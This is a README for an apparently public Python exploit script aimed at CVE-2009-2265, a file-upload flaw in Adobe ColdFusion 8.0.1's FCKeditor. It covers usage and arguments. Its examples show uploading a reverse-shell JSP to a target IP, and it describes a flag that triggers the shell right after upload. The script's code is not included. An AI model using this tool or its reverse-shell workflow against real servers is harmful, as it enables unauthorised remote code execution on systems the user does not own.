# cf8-upload.py ‚≠ê
a python implementation on CVE-2009-2265.

## the exploit - CVE-2009-2265 ‚ùó
the script exploits a vulnerability found in FCKeditor < 2.6.4.1 which was implemented into adobe coldfusion 8.0.1:  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2265  
the script allows the  user to submit a file to upload to a target computer
running coldfusion 8.0.1 which can then be accessed through LFI.
***

## prerequisites ‚úî
- python3 - the script uses only built-in python3 modules and there are no external requirements to run.
***

## usage ‚Ñπ
After identifying a target running adobe coldfusion 8.0.1, run with:
```
chmod +x cf8-upload.py
./cf8-upload.py -h
```
or
```
python3 cf8-upload.py -h
```
the -h or --help option shows how to run the script with a few examples.
there are three positional arguments and a few optional arguments.
```
./cf8-upload.py -h      
usage: cf8-upload.py [-h] [-a] [-n] [-r] ip port path

./cf8-upload.py exploits an LFI vulnerability in
adobe coldfusion 8.0.1

positional arguments:
  ip                ip address of target
  port              port of target
  path              path to file you wish to upload (eg.
                    '/path/to/file.txt')

optional arguments:
  -h, --help        show this help message and exit
  -a, --accessible  turns off features which may negatively affect
                    screen readers
  -n, --no-colour   removes colour output
  -r, --request     request webpage after successfully uploading
                    file

examples:
        ./cf8-upload.py 10.10.10.10 80 file.txt
        ./cf8-upload.py 10.10.10.10 8500 /path/to/reverse-shell.jsp -r
        ./cf8-upload.py hostname 8500 /path/to/upload.zip -n

```
### -- request argument
this flag makes the script perform a get request to the file, and only after it has been successfully uploaded. this option is useful if the user is uploading a reverse shell of some kind to the vulnerable application and wishes to immediately trigger it. the content of the get request is not printed to the terminal and only serves to trigger the event on the server.
***

## limitations ‚ö†
### different directory assumption:
the script makes the assumption that the adobe coldfusion 8.0.1 is running in the root directory of the webserver by default, though this may be changed in a future update, if adobe coldfusion 8.0.1 resides in a subdirectory.

## notes üìù
the script was mainly an exercise in creating a short, comprehensive, self-contained program for a single exploit with both readability and accessibility in mind.
